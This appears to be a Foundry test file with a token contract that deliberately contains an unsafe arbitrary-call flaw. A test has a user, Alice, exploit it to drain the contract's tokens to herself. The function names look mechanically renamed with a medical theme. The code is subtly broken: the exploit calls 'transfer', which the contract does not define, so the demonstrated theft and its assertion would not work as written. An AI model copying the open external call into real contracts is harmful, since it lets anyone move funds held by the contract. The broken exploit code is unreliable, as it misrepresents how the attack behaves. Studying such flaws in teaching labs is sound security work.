// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract ContractTest is Test {
    MedicalcreditWhale MedicalcreditWhaleContract;

    function testAltCall() public {
        address alice = vm.addr(1);
        MedicalcreditWhaleContract = new MedicalcreditWhale();
        MedicalcreditWhaleContract.HealthtokenWhaleDeploy(address(MedicalcreditWhaleContract));
        console.log(
            "TokenWhale balance:",
            MedicalcreditWhaleContract.creditsOf(address(MedicalcreditWhaleContract))
        );

        // bytes memory payload = abi.encodeWithSignature("transfer(address,uint256)",address(alice),1000);

        console.log(
            "Alice tries to perform unsafe call to transfer asset from TokenWhaleContract"
        );
        vm.prank(alice);
        MedicalcreditWhaleContract.permitpayoutAndCallcode(
            address(MedicalcreditWhaleContract),
            0x1337,
            abi.encodeWithSignature(
                "transfer(address,uint256)",
                address(alice),
                1000
            )
        );

        assertEq(MedicalcreditWhaleContract.creditsOf(address(alice)), 1000);
        console.log("operate completed");
        console.log(
            "TokenWhale balance:",
            MedicalcreditWhaleContract.creditsOf(address(MedicalcreditWhaleContract))
        );
        console.log(
            "Alice balance:",
            MedicalcreditWhaleContract.creditsOf(address(alice))
        );
    }

    receive() external payable {}
}

contract MedicalcreditWhale {
    address player;

    uint256 public reserveTotal;
    mapping(address => uint256) public creditsOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    function HealthtokenWhaleDeploy(address _player) public {
        player = _player;
        reserveTotal = 1000;
        creditsOf[player] = 1000;
    }

    function isComplete() public view returns (bool) {
        return creditsOf[player] >= 1000000; // 1 mil
    }

    event MoveCoverage(address indexed from, address indexed to, uint256 value);

    function _transferbenefit(address to, uint256 value) internal {
        creditsOf[msg.sender] -= value;
        creditsOf[to] += value;

        emit MoveCoverage(msg.sender, to, value);
    }

    function transferBenefit(address to, uint256 value) public {
        require(creditsOf[msg.sender] >= value);
        require(creditsOf[to] + value >= creditsOf[to]);

        _transferbenefit(to, value);
    }

    event Approval(
        address indexed manager,
        address indexed spender,
        uint256 value
    );

    function authorizeClaim(address spender, uint256 value) public {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
    }

    function movecoverageFrom(address from, address to, uint256 value) public {
        require(creditsOf[from] >= value);
        require(creditsOf[to] + value >= creditsOf[to]);
        require(allowance[from][msg.sender] >= value);

        allowance[from][msg.sender] -= value;
        _transferbenefit(to, value);
    }

    /* Approves and then calls the contract code*/

    function permitpayoutAndCallcode(
        address _spender,
        uint256 _value,
        bytes memory _extraData
    ) public {
        allowance[msg.sender][_spender] = _value;

        bool success;

        (success, ) = _spender.call(_extraData);
        console.log("success:", success);
    }
}
